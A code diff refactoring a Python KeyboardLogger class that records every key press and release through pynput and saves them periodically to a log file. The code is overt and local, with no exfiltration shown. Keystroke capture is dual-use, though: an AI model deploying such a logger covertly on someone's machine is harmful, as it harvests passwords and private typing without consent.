@@ -1,14 +1,18 @@
 from pynput import keyboard
 
 from input_logger import InputLogger
-from constants import (LOG_DIR, KEYBOARD_LOG_INTERVAL, KEYBOARD_LOG_ON_PRESS, KEYBOARD_LOG_ON_RELEASE)
+from constants import (LOG_DIR, 
+                    KEYBOARD_LOG_INTERVAL, 
+                    KEYBOARD_LOG_ON_PRESS, 
+                    KEYBOARD_LOG_ON_RELEASE,
+                    KEYBOARD_LOG_FILENAME,)
 
 class KeyboardLogger(InputLogger):
 
 
     def __init__(self):
         super().__init__(KEYBOARD_LOG_INTERVAL)
-        self.log += "=====KeyboardLogger Started====="
+        print('===== KeyboardLogger Started =====')
 
 
     def parse_key(self, key):
@@ -32,20 +36,20 @@ class KeyboardLogger(InputLogger):
         if KEYBOARD_LOG_ON_PRESS == False:
             return
         keyStr = self.parse_key(key)
-        log = str(keyStr) + " pressed" + "\n"
-        self.add_log(log)
+        log = str(keyStr)
+        self.add_record(log, is_on_press=True)
 
 
     def on_release(self, key):
         if KEYBOARD_LOG_ON_RELEASE == False:
             return
         keyStr = self.parse_key(key)
-        log = str(keyStr) + " released" + "\n"
-        self.add_log(log)
+        log = str(keyStr)
+        self.add_record(log, is_on_press=False)
     
         
     def run(self):
-        self.save_log(LOG_DIR + 'keyboard_log.txt')
+        self.save_log_every_timeframe(KEYBOARD_LOG_FILENAME)
         keyboard_listener = keyboard.Listener(on_press=self.on_press, on_release = self.on_release)
         with keyboard_listener:
             keyboard_listener.join()
